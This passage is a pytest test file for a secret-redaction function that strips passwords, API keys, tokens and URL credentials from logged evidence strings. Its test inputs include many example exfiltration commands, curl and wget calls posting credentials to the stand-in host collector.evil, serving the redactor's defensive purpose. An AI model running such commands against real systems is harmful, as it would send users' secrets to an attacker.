    text = f'curl {option} \'{{"password":"BODY_SECRET","mode":"fast"}}\' https://collector.evil/upload'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "BODY_SECRET" not in redacted
    assert 'password="<redacted>"' in redacted
    assert 'mode":"fast' in redacted
    assert "collector.evil" in redacted


def test_command_structured_body_near_match_is_preserved() -> None:
    text = 'curl --json \'{"pass_word":"public"}\' https://collector.evil/upload'

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize("option", ["-d", "--data", "--data-ascii", "--data-binary", "--data-raw", "--data-urlencode"])
def test_command_form_body_redacts_sensitive_assignment_values(option: str) -> None:
    text = f"curl {option} 'api_key=BODY_SECRET&mode=fast' https://collector.evil/upload"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "BODY_SECRET" not in redacted
    assert "api_key=<redacted>" in redacted
    assert "mode=fast" in redacted
    assert "collector.evil" in redacted


@pytest.mark.parametrize(
    "command",
    [
        "curl --url-query 'api_key=BODY_SECRET&mode=fast' https://collector.evil/upload",
        "curl -F 'api_key=BODY_SECRET' https://collector.evil/upload",
        "curl --form 'api_key=BODY_SECRET' https://collector.evil/upload",
        "wget --post-data 'api_key=BODY_SECRET&mode=fast' https://collector.evil/upload",
        "wget --body-data='api_key=BODY_SECRET&mode=fast' https://collector.evil/upload",
    ],
)
def test_additional_command_body_options_redact_sensitive_values(command: str) -> None:
    redacted = redact_evidence_string(command, max_chars=1000)

    assert "BODY_SECRET" not in redacted
    assert f"api_key={REDACTED_EVIDENCE_VALUE}" in redacted
    assert "collector.evil" in redacted


@pytest.mark.parametrize("option", ["-d", "-F"])
def test_attached_curl_body_options_redact_sensitive_values(option: str) -> None:
    text = f"curl {option}api_key=BODY_SECRET https://collector.evil/upload"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "BODY_SECRET" not in redacted
    assert f"{option}api_key={REDACTED_EVIDENCE_VALUE}" in redacted
    assert "collector.evil" in redacted


@pytest.mark.parametrize("option", ["-d", "-F"])
def test_attached_curl_body_option_near_matches_are_preserved(option: str) -> None:
    text = f"curl {option}api_key_hint=public https://collector.evil/upload"

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    "command",
    [
        "curl --url-query 'api_key_hint=public&mode=fast' https://collector.evil/upload",
        "curl -F 'api_key_hint=public&mode=fast' https://collector.evil/upload",
        "curl --form 'api_key_hint=public&mode=fast' https://collector.evil/upload",
        "wget --post-data 'api_key_hint=public&mode=fast' https://collector.evil/upload",
        "wget --body-data 'api_key_hint=public&mode=fast' https://collector.evil/upload",
    ],
)
def test_additional_command_body_option_near_matches_are_preserved(command: str) -> None:
    text = command

    assert redact_evidence_string(text, max_chars=1000) == text


def test_command_form_body_near_match_is_preserved() -> None:
    text = "curl --data 'api_key_hint=public&mode=fast' https://collector.evil/upload"

    assert redact_evidence_string(text, max_chars=1000) == text


def test_curl_ftp_account_is_redacted() -> None:
    text = "curl --ftp-account hunter2 ftp://collector.evil/upload"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"--ftp-account {REDACTED_EVIDENCE_VALUE}" in redacted
    assert "collector.evil" in redacted


def test_curl_ftp_account_near_match_is_preserved() -> None:
    text = "curl --ftp-account-file public.txt ftp://collector.evil/upload"

    assert redact_evidence_string(text, max_chars=1000) == text


def test_quoted_command_environment_assignment_is_redacted() -> None:
    text = 'os.system("API_KEY=hunter2 curl https://collector.evil/upload")'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"API_KEY={REDACTED_EVIDENCE_VALUE}" in redacted
    assert "curl https://collector.evil/upload" in redacted


def test_quoted_command_environment_assignment_near_match_is_preserved() -> None:
    text = 'os.system("API_KEY_HINT=public curl https://collector.evil/upload")'

    assert redact_evidence_string(text, max_chars=1000) == text


def test_adjacent_command_literals_redact_split_query_secret() -> None:
    text = 'os.system("curl https://collector.evil/upload?api_" "key=hunter2")'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"api_key={REDACTED_EVIDENCE_VALUE}" in redacted
    assert "curl https://collector.evil/upload" in redacted
    assert redacted.endswith("')")


@pytest.mark.parametrize(
    "text",
    [
        'os.system(f"curl https://collector.evil/upload?api_" "key=hunter2")',
        'os.system("curl https://collector.evil/upload?api_"\n# keep command readable\n"key=hunter2")',
    ],
)
def test_adjacent_command_literal_variants_redact_split_query_secret(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"api_key={REDACTED_EVIDENCE_VALUE}" in redacted
    assert redacted.endswith("')")


def test_adjacent_command_literal_query_near_match_is_preserved() -> None:
    text = 'os.system("curl https://collector.evil/upload?api_" "key_hint=public")'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "public" in redacted
    assert REDACTED_EVIDENCE_VALUE not in redacted


def test_similarly_named_process_option_is_not_treated_as_a_password() -> None:
    """A non-credential option that merely starts with password should remain intact."""
    text = "curl --password-policy strict https://collector.evil.example/upload"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "--password-policy strict" in redacted


@pytest.mark.parametrize(
    ("text", "secret", "expected_context"),
    [
        (
            'os.system("psql postgresql://alice:hunter2@db.example/prod")',
            "hunter2",
            "postgresql://<credentials-redacted>@db.example/prod",
        ),
        (
            r'os.system("curl https:\/\/alice:hunter3@collector.evil.example/upload")',
            "hunter3",
            "https://<credentials-redacted>@collector.evil.example/upload",
        ),
    ],
)
def test_redacts_generic_and_serialized_url_credentials(text: str, secret: str, expected_context: str) -> None:
    redacted = redact_evidence_string(text, max_chars=500)

    assert secret not in redacted
    assert expected_context in redacted


@pytest.mark.parametrize(
    ("key", "secret"),
    [
        ("AWS_ACCESS_KEY_ID", "AKIAIOSFODNN7EXAMPLE"),
        ("session_id", "session-value-7"),
        ("jwt", "header.payload.signature"),
        ("passphrase", "correct-horse-battery-staple"),
        ("pwd", "hunter4"),
    ],
)
def test_redacts_common_credential_assignment_names(key: str, secret: str) -> None:
    redacted = redact_evidence_string(f'{key}={secret} os.system("id")', max_chars=500)

    assert secret not in redacted
    assert f"{key}={REDACTED_EVIDENCE_VALUE}" in redacted
    assert "os.system" in redacted


@pytest.mark.parametrize(
    "text",
    [
        "access_key_identifier=public-name",
        "session_tokenizer=bert-base",
        "jwt_algorithm=RS256",
        'os.system("pwd /workspace")',
    ],
)
def test_similarly_named_credential_keys_are_preserved(text: str) -> None:
    assert redact_evidence_string(text, max_chars=500) == text


def test_redacts_ansi_quoted_command_credentials() -> None:
    text = "curl --password $'hunter5' --proxy-user $'alice:hunter6' https://collector.evil.example/upload"

    redacted = redact_evidence_string(text, max_chars=500)

    assert "hunter5" not in redacted
    assert "hunter6" not in redacted
    assert "curl" in redacted
    assert "collector.evil.example" in redacted


def test_escapes_control_and_format_characters_in_evidence() -> None:
    text = 'os.system("id")\x1b[2J\nFORGED\u202eOUTPUT'

    redacted = redact_evidence_string(text, max_chars=500)

    assert "\x1b" not in redacted
    assert "\n" not in redacted
    assert "\u202e" not in redacted
    assert r"\u001b" in redacted
    assert r"\n" in redacted
    assert r"\u202e" in redacted


@pytest.mark.parametrize(
    ("text", "secret", "expected"),
    [
        ('{"pass\u200bword":"QUOTED_CONTROL_SECRET"}; os.system("id")', "QUOTED_CONTROL_SECRET", "password=<redacted>"),
        ('{"pass\u200bword_policy":"public"}; os.system("id")', None, "public"),
    ],
)
def test_quoted_embedded_control_sensitive_keys_are_normalized(
    text: str,
    secret: str | None,
    expected: str,
) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    if secret is not None:
        assert secret not in redacted
    assert expected in redacted


@pytest.mark.parametrize(
    ("text", "secret", "expected_context"),
    [
        ('auth=("alice", "hunter2"); os.system("id")', "hunter2", "auth=<redacted>"),
        ('basic_auth=("alice", "hunter3"); os.system("id")', "hunter3", "basic_auth=<redacted>"),
        ('config["auth"]="hunter4"; os.system("id")', "hunter4", "auth=<redacted>"),
        ('api\u200b_key=hunter5; os.system("id")', "hunter5", "api_key=<redacted>"),
        ('api\x00_key=hunter6; os.system("id")', "hunter6", "api_key=<redacted>"),
        (
            'client.set_secret(name="api_key", value="hunter7"); os.system("id")',
            "hunter7",
            'value="<redacted>"',
        ),
        ('client.set_api_key(value="hunter8"); os.system("id")', "hunter8", 'value="<redacted>"'),
        ('client.setApiKey("hunter8b"); os.system("id")', "hunter8b", 'client.setApiKey("<redacted>")'),
        ('setPassword("hunter8c"); os.system("id")', "hunter8c", 'setPassword("<redacted>")'),
        ('client.setDbPassword("hunter8d"); os.system("id")', "hunter8d", 'setDbPassword("<redacted>")'),
        (
            'client.setAwsAccessKeyId("hunter8e"); os.system("id")',
            "hunter8e",
            'setAwsAccessKeyId("<redacted>")',
        ),
        ('client.setCookie("hunter8f"); os.system("id")', "hunter8f", 'setCookie("<redacted>")'),
        ('setJwt("hunter8g"); os.system("id")', "hunter8g", 'setJwt("<redacted>")'),
        ('setBasicAuth("hunter8h"); os.system("id")', "hunter8h", 'setBasicAuth("<redacted>")'),
        ('setAuthorization("hunter8i"); os.system("id")', "hunter8i", 'setAuthorization("<redacted>")'),
        (
            'client.setCredentials("alice", "hunter8j"); os.system("id")',
            "hunter8j",
            'setCredentials("<redacted>", "<redacted>")',
        ),
        (
            'client.setCredentials(username="alice", password="hunter8k"); os.system("id")',
            "hunter8k",
            'password="<redacted>")',
        ),
        (
            'config={chr(97)+chr(112)+chr(105)+chr(95)+chr(107)+chr(101)+chr(121): "hunter9", '
            '"cmd": "os.system(\\"id\\")"}',
            "hunter9",
            "api_key=<redacted>",
        ),
        (
            'config={bytes([97,112,105,95,107,101,121]).decode(): "hunter10", "cmd": "os.system(\\"id\\")"}',
            "hunter10",
            "api_key=<redacted>",
        ),
    ],
)
def test_redacts_composite_and_obfuscated_sensitive_values(
    text: str,
    secret: str,
    expected_context: str,
) -> None:
    redacted = redact_evidence_string(text, max_chars=500)

    assert secret not in redacted
    assert expected_context in redacted
    assert "os.system" in redacted


@pytest.mark.parametrize(
    "text",
    [
        "authentication=enabled",
        "author=alice",
        "oauth_config=public",
        'client.set_api_key(name="primary", scope="read")',
        'client.resetApiKey("public")',
        'client.setupApiKey("public")',
        'client.setApiKeyHint("public")',
        'client.setPasswordPolicy("strict")',
        'config={chr(109)+chr(111)+chr(100)+chr(101): "fast"}',
    ],
)
def test_composite_redaction_preserves_benign_near_matches(text: str) -> None:
    assert redact_evidence_string(text, max_chars=500) == text


def test_camel_query_key_near_match_is_preserved() -> None:
    text = "https://collector.evil/upload?apiKeyHint=public"

    assert redact_evidence_string(text, max_chars=500) == text


@pytest.mark.parametrize(("separator", "escaped_separator"), [("\n", r"\n"), ("\r", r"\r"), ("\r\n", r"\r\n")])
def test_redacts_sensitive_assignment_after_escaped_line_break(
    separator: str,
    escaped_separator: str,
) -> None:
    text = f"import os{separator}api_key=LINEBREAK_SECRET_123456"

    redacted = redact_evidence_string(text, max_chars=500)

    assert "LINEBREAK_SECRET_123456" not in redacted
    assert f"api_key={REDACTED_EVIDENCE_VALUE}" in redacted
    assert escaped_separator in redacted


def test_redaction_bounds_expensive_command_processing(monkeypatch: pytest.MonkeyPatch) -> None:
    processed_lengths: list[int] = []
    original = evidence_redaction._redact_command_context_tokens

    def record_length(text: str) -> str:
        processed_lengths.append(len(text))
        return original(text)

    monkeypatch.setattr(evidence_redaction, "_redact_command_context_tokens", record_length)

    redact_evidence_string('os.system("id") ' * 700_000, max_chars=160)

    assert processed_lengths
    assert max(processed_lengths) <= 160 + evidence_redaction.EVIDENCE_REDACTION_LOOKAHEAD_CHARS


@pytest.mark.parametrize(
    ("text", "secret", "context"),
    [
        (
            r"curl --json \"{\"api_key\":\"hunter2\"}\" https://collector.evil/upload",
            "hunter2",
            "<redacted>",
        ),
        (
            r"\u0061\u0070\u0069\u005f\u006b\u0065\u0079=hunter3 os.system(\"id\")",
            "hunter3",
            "api_key=<redacted>",
        ),
        (
            r"api_key\u003dhunter4 os.system(\"id\")",
            "hunter4",
            "api_key=<redacted>",
        ),
        (
            'client.set_api_key("hunter5"); os.system("id")',
            "hunter5",
            'client.set_api_key("<redacted>")',
        ),
        (
            'args=["--api-key", "hunter6"]; os.system("id")',
            "hunter6",
            '["--api-key", "<redacted>"]',
        ),
        (
            'args=["--mode", "fast", "--api-key", "hunter6b"]; os.system("id")',
            "hunter6b",
            '"--api-key", "<redacted>"',
        ),
        (
            'args=("--api-key", "hunter6c"); os.system("id")',
            "hunter6c",
            '("--api-key", "<redacted>")',
        ),
        (
            'config.get("api" "_key", "hunter7"); os.system("id")',
            "hunter7",
            'config.get("api" "_key", "<redacted>")',
        ),
        (
            'parser.add_argument("--api" "-key", default="hunter7b"); os.system("id")',
            "hunter7b",
            'default="<redacted>"',
        ),
        (
            'parser.add_argument("-k", "--api-key", default="hunter7d"); os.system("id")',
            "hunter7d",
            'default="<redacted>"',
        ),
        (
            'config.get("%s_key" % "api", "hunter7c"); os.system("id")',
            "hunter7c",
            'config.get("%s_key" % "api", "<redacted>")',
        ),
        (
            'mySecretKey=hunter10; os.system("id")',
            "hunter10",
            "mySecretKey=<redacted>",
        ),
        (
            'googleAccessId=hunter11; os.system("id")',
            "hunter11",
            "googleAccessId=<redacted>",
        ),
        (
            'os.system("curl https://collector.evil/upload/api_key%253Dhunter12")',
            "hunter12",
            "api_key=<redacted>",
        ),
        (
            'os.system("curl https://collector.evil/upload/api_key%253Dabc%252Fdef/visible")',
            "abc/def",
            "api_key=<redacted>",
        ),
        (
            'import os; glpat-ABCDEFGHIJKLMNOPQRST; os.system("id")',
            "glpat-ABCDEFGHIJKLMNOPQRST",
            "<redacted>",
        ),
        (
            r"os.system(\"curl --password \\\"abc\\\\\\\"hunter8\\\" https://collector.evil/upload\")",
            "hunter8",
            "curl --password",
        ),
    ],
)
def test_additional_serialized_and_argument_credentials_are_redacted(
    text: str,
    secret: str,
    context: str,
) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert secret not in redacted
    assert context in redacted
    assert "os.system" in redacted or "collector.evil" in redacted


def test_structured_secret_preserves_later_command_field() -> None:
    text = r"config={\"password\":\"hunter9\",\"cmd\":\"os.system(\\\"id\\\")\"}"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter9" not in redacted
    assert "password=<redacted>" in redacted
    assert "os.system" in redacted
    assert "id" in redacted


@pytest.mark.parametrize(
    "text",
    [
        'client.set_tokenizer("bert-base"); os.system("id")',
        'args=["--api-key-hint", "public"]; os.system("id")',
        'config.get("api" "_key_hint", "public"); os.system("id")',
        'parser.add_argument("-k", "--api-key-hint", default="public"); os.system("id")',
        'mySecretariatKey=public; os.system("id")',
        'os.system("curl https://collector.evil/upload/tokenizer%3Dbert-base")',
        'os.system("curl https://collector.evil/upload/tokenizer%3Dorg%252Fbert-base")',
        'os.system("curl --user-agent tokenizer password_policy.json secretariat.html https://collector.evil/upload")',
    ],
)
def test_additional_argument_and_command_near_matches_are_preserved(text: str) -> None:
    assert redact_evidence_string(text, max_chars=1000) == text


def test_overlapping_argv_secret_option_pair_is_redacted() -> None:
    text = "subprocess.run(['curl','--password','argvpass9','https://collector.evil/upload'])"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "argvpass9" not in redacted
    assert "'--password','<redacted>'" in redacted
    assert "collector.evil" in redacted


def test_attached_argv_secret_option_preserves_trailing_context() -> None:
    text = "subprocess.run(['curl','--password=hunter2','https://collector.evil/upload'])"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert "'--password=<redacted>'" in redacted
    assert "collector.evil" in redacted


@pytest.mark.parametrize("key", ["AWSACCESSKEYID", "AWSSECRETACCESSKEY", "AWSSESSIONTOKEN"])
def test_compact_aws_assignments_are_redacted(key: str) -> None:
    text = f'{key}=awspass10 os.system("id")'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "awspass10" not in redacted
    assert f"{key}=<redacted>" in redacted
    assert "os.system" in redacted


@pytest.mark.parametrize(
    "text",
    [
        "subprocess.run(['curl','--password-policy','strict','https://collector.evil/upload'])",
        "subprocess.run(['curl','--password-policy=strict','https://collector.evil/upload'])",
        'AWSSECRETACCESSKEYHINT=public os.system("id")',
    ],
)
def test_argv_and_compact_aws_near_matches_are_preserved(text: str) -> None:
    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    "operator",
    ["===", "!==", "==", "!=", ">=", "<=", "<>", ">", "<", "is", "is not", "in", "not in"],
)
def test_sensitive_comparison_operators_redact_literals_and_preserve_command(operator: str) -> None:
    secret = f"OPERATOR-{operator.replace(' ', '-')}-SECRET-123456"
    text = f'client_secret {operator} "{secret}"; os.system("id")'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert secret not in redacted
    assert 'os.system("id")' in redacted


@pytest.mark.parametrize(
    ("text", "secrets"),
    [
        (
            '"REVERSED-COMPARISON-SECRET-123456" == client_secret; os.system("id")',
            ("REVERSED-COMPARISON-SECRET-123456",),
        ),
        (
            '"LOW-COMPARISON-SECRET-123456" < client_secret < "HIGH-COMPARISON-SECRET-123456"; os.system("id")',
            ("LOW-COMPARISON-SECRET-123456", "HIGH-COMPARISON-SECRET-123456"),
        ),
        (
            'client_secret == ("PAREN-COMPARISON-SECRET-123456"); os.system("id")',
            ("PAREN-COMPARISON-SECRET-123456",),
        ),
        (
            'client_secret == ["LIST-COMPARISON-SECRET-123456"]; os.system("id")',
            ("LIST-COMPARISON-SECRET-123456",),
        ),
        (
            'client_secret == {"name": "DICT-COMPARISON-SECRET-123456"}; os.system("id")',
            ("DICT-COMPARISON-SECRET-123456",),
        ),
        (
            'client_secret == "PART-A-SECRET" + "CONCAT-COMPARISON-SECRET-123456"; os.system("id")',
            ("PART-A-SECRET", "CONCAT-COMPARISON-SECRET-123456"),
        ),
        (
            'client_secret == "PART-B-SECRET" "ADJACENT-COMPARISON-SECRET-123456"; os.system("id")',
            ("PART-B-SECRET", "ADJACENT-COMPARISON-SECRET-123456"),
        ),
        (
            'client_secret == "%s" % "PERCENT-COMPARISON-SECRET-123456"; os.system("id")',
            ("PERCENT-COMPARISON-SECRET-123456",),
        ),
        (
            'client_secret == "YES-COMPARISON-SECRET-123456" if enabled else "NO-COMPARISON-SECRET-123456"; '
            'os.system("id")',
            ("YES-COMPARISON-SECRET-123456", "NO-COMPARISON-SECRET-123456"),
        ),
        (
            'client_secret == lookup("CALL-COMPARISON-SECRET-123456"); os.system("id")',
            ("CALL-COMPARISON-SECRET-123456",),
        ),
        (
            'client_secret == <redacted> + "MARKER-TAIL-COMPARISON-SECRET-123456"; os.system("id")',
            ("MARKER-TAIL-COMPARISON-SECRET-123456",),
        ),
        (
            '"client_secret" == "QUOTED-KEY-COMPARISON-SECRET-123456"; os.system("id")',
            ("QUOTED-KEY-COMPARISON-SECRET-123456",),
        ),
        (
            'config["client_secret"] == "SUBSCRIPT-KEY-COMPARISON-SECRET-123456"; os.system("id")',
            ("SUBSCRIPT-KEY-COMPARISON-SECRET-123456",),
        ),
        (
            '(client_secret) == "GROUPED-KEY-COMPARISON-SECRET-123456"; os.system("id")',
            ("GROUPED-KEY-COMPARISON-SECRET-123456",),
        ),
        (
            'config[("client" + "_secret")] == "COMPOSED-SUBSCRIPT-COMPARISON-SECRET-123456"; os.system("id")',
            ("COMPOSED-SUBSCRIPT-COMPARISON-SECRET-123456",),
        ),
        (
            '"HUNTER2" == config["client_secret"]; os.system("id")',
            ("HUNTER2",),
        ),
        (
            '"OPAQUE-VALUE-CRED-123456" == "client_secret"; os.system("id")',
            ("OPAQUE-VALUE-CRED-123456",),
        ),
    ],
)
def test_sensitive_comparison_statements_redact_compound_and_reversed_literals(
    text: str,
    secrets: tuple[str, ...],
) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert all(secret not in redacted for secret in secrets)
    assert 'os.system("id")' in redacted


def test_sensitive_comparison_preserves_command_operand() -> None:
    redacted = redact_evidence_string('client_secret == os.system("id")', max_chars=1000)

    assert 'os.system("id")' in redacted


@pytest.mark.parametrize(
    "text",
    [
        'tokenizer == "bert-base"; os.system("id")',
        'label == "client_secret"; os.system("id")',
    ],
)
def test_comparison_near_matches_are_preserved(text: str) -> None:
    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    "text",
    [
        "password <redacted>",
        "<redacted> password",
        "password <credentials-redacted>",
        "<credentials-redacted> password",
    ],
)
def test_comparison_parser_ignores_redaction_marker_delimiters(text: str) -> None:
    assert evidence_redaction._redact_sensitive_comparison_statements(text) == text


def test_excessive_comparison_candidates_fail_closed_for_sensitive_keys() -> None:
    comparisons = " or ".join(f'client_secret == "DENSE-COMPARISON-SECRET-{index}"' for index in range(65))
    text = f'{comparisons}; os.system("id")'

    assert redact_evidence_string(text, max_chars=10_000) == REDACTED_EVIDENCE_VALUE


def test_quoted_comparison_decoys_do_not_consume_candidate_budget() -> None:
    decoys = "; ".join('print("client_secret == inert")' for _ in range(65))
    text = f'os.system("id"); {decoys}'

    redacted = redact_evidence_string(text, max_chars=10_000)

    assert redacted != REDACTED_EVIDENCE_VALUE
    assert 'os.system("id")' in redacted
